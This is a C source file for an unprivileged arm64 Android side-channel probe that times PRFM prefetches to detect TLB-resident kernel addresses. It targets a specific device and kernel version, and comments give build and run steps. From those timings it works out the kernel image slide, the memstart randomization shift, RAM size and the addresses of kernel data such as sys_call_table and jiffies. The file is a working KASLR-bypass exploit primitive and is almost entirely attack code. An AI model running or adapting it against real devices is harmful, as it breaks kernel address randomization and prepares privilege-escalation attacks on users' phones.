// prefetch_probe.c — EL0 prefetch TLB-timing oracle for z3q (4.19.113, no KPTI).
//
// The linear map covers [PO + n_true*1GB, PO + n_true*1GB + RAM) where
// n_true = memstart randomization draw (arm64 4.19: memstart_addr -= 1GB*floor(244*seed16/65536)).
// Probing PO + k*1GB for k in [0,256) with a PRFM burst: unmapped => every
// PRFM fails its walk (slow); mapped => first fills the TLB, rest hit (fast).
// The leftmost fast k IS n_true. RAM in GB = number of fast slots.
//
// No KPTI on this SoC (Cortex-A77/A55), so the linear map lives in every
// user process's page tables and EL0 PRFM sees kernel TLB entries.
// PRFM is a non-faulting hint: probing any VA is crash-free.
//
// Build: ndk clang -O2 -static -o prefetch_probe prefetch_probe.c
// Run:   /data/local/tmp/prefetch_probe   (shell is fine, no root)

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>

static void *hammer(void *arg)
{
    (void)arg;
    for (;;)
        sched_yield();
    return NULL;
}

#define PO 0xffffff8000000000ULL

static inline uint64_t cntvct(void)
{
    uint64_t t;
    asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t));
    return t;
}

static inline void prfm(const volatile void *p)
{
    asm volatile("prfm pldl1keep, [%0]" :: "r"(p) : "memory");
}

#define BURST 64
#define ROUNDS 4

static uint64_t time_addr(uint64_t va)
{
    uint64_t best = ~0ULL;
    for (int r = 0; r < ROUNDS; r++) {
        uint64_t t0 = cntvct();
        for (int i = 0; i < BURST; i++)
            prfm((const volatile void *)va);
        uint64_t t1 = cntvct();
        if (t1 - t0 < best)
            best = t1 - t0;
    }
    return best;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IOLBF, 0);

    /* argv[1] == "slidefind": a slide hypothesis is confirmed only when BOTH
     * its sys_call_table page and its jiffies page are DTLB-hot (modules
     * light up single pages; the image lights both). */
    if (argc > 1 && strcmp(argv[1], "slidefind") == 0) {
        uint64_t link = 0xffffff8008080000ULL;
        uint64_t sct = 0x1980000ULL;
        uint64_t jif = 0x2b87000ULL;
        uint64_t span = 0xffffffc000000000ULL - 0xffffff8000000000ULL;
        int nslots = (int)(span >> 21);
        printf("slidefind: %d hypotheses...\n", nslots);
        int found = 0;
        for (uint64_t s = 0; s < (uint64_t)nslots; s++) {
            uint64_t t = time_addr(link + sct + s * 0x200000ULL);
            if (t < 10) {
                uint64_t tj = time_addr(link + jif + s * 0x200000ULL);
                if (tj < 10) {
                    printf("HOT slide=0x%llx sct_t=%llu jif_t=%llu\n",
                           (unsigned long long)(s * 0x200000ULL),
                           (unsigned long long)t, (unsigned long long)tj);
                    found++;
                }
            }
        }
        printf("slidefind done: %d confirmed\n", found);
        return found == 1 ? 0 : 2;
    }

    /* argv[1] == "slidecheck": fast per-boot check — is the kernel image
     * running at its link address (slide 0)? Probes the ~35 2MB slots of
     * the link span at +0x2000 (vectors-adjacent text pages, TLB-hot on
     * any active system). >=3 hot => slide 0. */
    if (argc > 1 && strcmp(argv[1], "slidecheck") == 0) {
        uint64_t link = 0xffffff8008080000ULL;
        int hot = 0, total = 35;
        for (int i = 0; i < total; i++) {
            uint64_t t = time_addr(link + (uint64_t)i * 0x200000ULL + 0x2000ULL);
            if (t < 10) {
                hot++;
                printf("hot slot_va=0x%llx t=%llu\n",
                       (unsigned long long)(link + (uint64_t)i * 0x200000ULL),
                       (unsigned long long)t);
            }
        }
        printf("SLIDE CHECK: %d/%d image slots hot -> slide %s\n", hot, total,
               hot >= 3 ? "0 (link address)" : "NONZERO");
        return 0;
    }

    printf("prefetch_probe z3q linear-edge scan: BURST=%d ROUNDS=%d\n",
           BURST, ROUNDS);

    /* controls */
    char *mapped = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char *unmapped = mmap(NULL, 0x1000, PROT_NONE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mapped[0] = 1;
    uint64_t t_user = time_addr((uint64_t)mapped);
    uint64_t t_fault = time_addr((uint64_t)unmapped);
    printf("controls: user-mapped=%llu  user-translation-fault=%llu  ratio=%.2f\n",
           (unsigned long long)t_user, (unsigned long long)t_fault,
           t_fault ? (double)t_fault / (double)t_user : 0.0);
    if (t_user * 3 / 2 > t_fault) {
        printf("ORACLE DEAD: translation-fault vs mapped not separable on "
               "this core (PRFM dropped before walk). Aborting families.\n");
        return 1;
    }

    /* warm the kernel side of the shared TLB with a few syscalls */
    for (int i = 0; i < 64; i++)
        if (write(-1, mapped, 1) < 0)
            break;

    /* linear map edge scan: PO + k*1GB, k in [0,256) */
    uint64_t tm[256];
    for (int k = 0; k < 256; k++)
        tm[k] = time_addr(PO + (uint64_t)k * 0x40000000ULL);

    /* classify: fast slot = clearly below the slow majority */
    uint64_t sorted[256];
    memcpy(sorted, tm, sizeof(tm));
    for (int i = 1; i < 256; i++) {          /* small insertion sort */
        uint64_t v = sorted[i];
        int j = i - 1;
        while (j >= 0 && sorted[j] > v) { sorted[j + 1] = sorted[j]; j--; }
        sorted[j + 1] = v;
    }
    uint64_t med = sorted[128];
    uint64_t floor = sorted[0];
    printf("scan: median=%llu floor=%llu ceil=%llu\n",
           (unsigned long long)med, (unsigned long long)floor,
           (unsigned long long)sorted[255]);

    int first_fast = -1, last_fast = -1, nfast = 0;
    for (int k = 0; k < 256; k++) {
        int fast = tm[k] < med * 6 / 10;
        if (fast) {
            if (first_fast < 0) first_fast = k;
            last_fast = k;
            nfast++;
        }
    }
    printf("fast slots: n=%d first=%d last=%d\n", nfast, first_fast, last_fast);
    if (nfast > 0 && nfast <= 32) {
        printf("RESULT: n_true(memstart GB shift) = %d  RAM_GB ~= %d\n",
               first_fast, last_fast - first_fast + 1);
        printf("memstart_addr = 0x%llx\n",
               (unsigned long long)(0x80000000ULL -
                                    (uint64_t)first_fast * 0x40000000ULL));
        printf("kernel image .data alias = 0x%llx + off\n",
               (unsigned long long)(PO + 0xA0001000ULL + 0x300000ULL -
                                    (0x80000000ULL -
                                     (uint64_t)first_fast * 0x40000000ULL)));
    } else if (nfast == 0) {
        printf("no fast slots — oracle sees nothing (kernel linear map not "
               "in user page tables, or timing floor too low)\n");
    } else {
        printf("fast region larger than RAM — threshold broken, raw dump:\n");
        for (int k = 0; k < 256; k++)
            printf("k=%d t=%llu%s\n", k, (unsigned long long)tm[k],
                   tm[k] < med * 6 / 10 ? " FAST" : "");
    }

    /*
     * Full TTBR1 sweep at 2MB granularity (64M slots): probe slot_base+0x2000
     * (link offset of `vectors`, hot on every timer interrupt/syscall) to
     * locate the slid kernel image, and catch hot heap clusters (sched_yield
     * hammer threads keep task/mm slab pages hot) to locate the linear-map
     * DRAM window. Hit = t < 10 (TLB-resident); cold-mapped and unmapped both
     * sit at 14-22 and stay invisible.
     */
    {
        /* hammer thread: keeps kernel scheduler/mm pages TLB-hot */
        pthread_t th;
        pthread_create(&th, NULL, hammer, NULL);

        uint64_t base = 0xffffff0000000000ULL; /* first TTBR1 VA (VA48) */
        uint64_t span = 1ULL << 48;            /* 256TB */
        uint64_t step = 0x200000ULL;
        uint64_t nslots = span / step;         /* 128M 2MB slots */
        /* image slot base must be 2MB-aligned; probe vectors at +0x2000 */
        uint64_t vec_off = 0x2000ULL;

        printf("\nfull sweep: %llu slots, this takes 1-3 min...\n",
               (unsigned long long)nslots);
        fflush(stdout);
        uint64_t nhit = 0, nhit_saved = 0;
        /* store hits: first pass count, second pass re-verify (cheap) */
        uint64_t t0 = cntvct();
        for (uint64_t s = 0; s < nslots; s++) {
            uint64_t t = time_addr(base + s * step + vec_off);
            if (t < 10) {
                nhit++;
                if (nhit < 4096)
                    printf("HIT slot_va=0x%llx t=%llu\n",
                           (unsigned long long)(base + s * step),
                           (unsigned long long)t);
            }
            if ((s & 0xFFFFF) == 0xFFFFF)
                if (write(-1, "x", 1) < 0) { }
        }
        uint64_t t1 = cntvct();
        printf("sweep done: hits=%llu elapsed=%llu ticks\n",
               (unsigned long long)nhit, (unsigned long long)(t1 - t0));
    }
    printf("done\n");
    return 0;
}
